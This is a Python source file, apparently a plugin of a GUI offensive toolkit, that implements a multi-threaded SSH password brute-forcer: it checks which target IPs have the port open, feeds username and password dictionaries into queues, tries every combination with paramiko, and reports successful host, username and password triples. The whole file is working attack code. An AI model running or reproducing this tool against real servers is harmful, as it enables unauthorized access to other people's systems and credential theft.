from PyQt5.Qt import QThread,pyqtSignal
import time
import threading
import queue
import socket
import paramiko
import plugins.config


class Brute_ssh(QThread):
    q_ip = queue.Queue()  # ip地址列队
    q_user = queue.Queue()  # 用户名列队
    q_passwd = queue.Queue()  # 密码列队
    host = ''
    user = ''
    login = []
    Error_count = 0
    lock = threading.Lock()
    str_signal = pyqtSignal([str,str])
    int_signal = pyqtSignal([int,int])

    def __init__(self,ip_addr,ip_addr_file,username_file,port,password_file,thread):
        super().__init__()
        self.ip_addr = ip_addr
        self.ip_addr_file = ip_addr_file
        self.username_file = username_file
        self.port = port
        self.password_file = password_file
        self.thread = thread


    def run(self):
        self.str_signal[str,str].emit('[+] 开始解析参数...','green')
        ip_list = []
        username_file = ''
        password_file = ''
        thread = int(self.thread)
        self.port = int(self.port)
        if self.ip_addr == '':
            try:
                with open(self.ip_addr_file,'r') as f:
                    for ip in f.readlines():
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(2)
                            s.connect((ip.strip(), self.port))
                            s.close()
                            ip_list.append(ip.strip())
                        except:
                            self.str_signal[str, str].emit('[-] ' + ip.strip() + ' 端口连接失败，放弃爆破...', 'red')
            except:
                self.str_signal[str, str].emit('[-] 没有找到ip_addr_file文件,请检查输入', 'red')
                return
        else:
            ip_list.append(self.ip_addr)
        if self.username_file == '':
            username_file = 'dict/brute_username.txt'
        else:
            username_file = self.username_file
        if self.password_file == '':
            password_file = 'dict/brute_password.txt'
        else:
            password_file = self.password_file

        self.brute_ssh(ip_list,username_file,password_file,thread)
        self.login = []



    def control(self,user_dict, pass_dict, thread_count):  # 控制列队

        self.host = self.q_ip.get()
        self.user = self.q_user.get()
        while True:
            if self.q_passwd.qsize() == 0:  # 判断是否还有密码列队
                time.sleep(1)  # 防止提前更换账号
                if self.q_user.qsize() == 0:  # 判断是否还有账号列队
                    if self.q_ip.qsize() == 0:  # 判断是否还有ip列队
                        break
                    else:
                        self.host = self.q_ip.get()
                        self.Error_count = 0  # 报错次数清零

                        try:
                            with open(user_dict, 'r') as f:  # 添加用户名到列队
                                for user in f.readlines():
                                    user = user.strip('\n')
                                    self.q_user.put(user)
                        except FileNotFoundError:
                            self.str_signal[str, str].emit('[-] 没有找到用户名的文件！', 'red')
                else:
                    self.user = self.q_user.get()
                    try:
                        with open(pass_dict, 'r') as f:  # 添加密码到列队
                            for password in f.readlines():
                                pas = password.strip('\n')
                                self.q_passwd.put(pas)
                    except FileNotFoundError:
                        self.str_signal[str, str].emit('[-] 没有找到密码的文件！', 'red')


    def thread_ssh(self):  # 线程
        while True:
            if plugins.config.brute_wait == 0:
                if self.q_passwd.qsize() == 0:  # 判断是否还有密码列队
                    if self.q_user.qsize() == 0:  # 判断是否还有账号列队
                        if self.q_ip.qsize() == 0:  # 判断是否还有ip列队
                            break
                try:
                    password = self.q_passwd.get(block=True, timeout=10)  # 密码列队为空时 10秒内没数据 就结束
                except:
                    break

                try:
                    self.connect(self.host,self.port,self.user,password)
                    self.lock.acquire()  # 加锁
                    self.str_signal[str, str].emit('[+] ' + time.strftime('%H:%M:%S', time.localtime()) + ' ssh成功 %s -- >%s : %s' % (
                        self.host, self.user, password), 'green')
                    self.login.append({'host':self.host,
                                       'username':self.user,
                                       'password':password})
                    while not self.q_passwd.empty():  # 密码正确后 清理密码列队
                        self.q_passwd = queue.Queue()
                    self.lock.release()  # 解锁
                except Exception as e:
                    self.str_signal[str, str].emit('[-] ' + time.strftime('%H:%M:%S', time.localtime()) + ' ssh错误 %s --> %s : %s' % (
                    self.host, self.user, password), 'red')
            else:
                time.sleep(1)

    def brute_ssh(self,ip, user_dict, pass_dict, thread_count):  # ip地址(列表)，账号文件，密码文件，线程数
        thread = []

        for i in ip:  # 添加ip到列队
            self.q_ip.put(i)
        try:
            with open(user_dict, 'r') as f:  # 添加用户名到列队
                for user in f.readlines():
                    user = user.strip('\n')
                    self.q_user.put(user)
        except FileNotFoundError:
            self.str_signal[str, str].emit('[-] 没有找到用户名的文件！', 'red')
        try:
            with open(pass_dict, 'r') as f:  # 添加密码到列队
                for password in f.readlines():
                    pas = password.strip('\n')
                    self.q_passwd.put(pas)
        except FileNotFoundError:
            self.str_signal[str, str].emit('[-] 没有找到密码的文件！', 'red')

        thread_control = threading.Thread(target=self.control, args=(user_dict, pass_dict, thread_count,))
        thread_control.start()

        for i in range(thread_count):
            f = threading.Thread(target=self.thread_ssh)
            f.start()
            thread.append(f)
        for i in thread:
            i.join()

        time.sleep(2)  # 防止线程打印没完成就打印
        if self.login == []:
            self.str_signal[str, str].emit('[+] 爆破结束，没有爆破成功！', 'red')
        else:
            self.str_signal[str, str].emit('[+] 爆破结束，结果为:', 'green')
            for result in self.login:
                self.str_signal[str, str].emit('    ' + result['host'] + ' -> ' + result['username'] + ':' + result['password'], 'green')

    def connect(self,host,port,user,password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host, username=user, password=password, port=port,timeout=5)
        ssh.close()


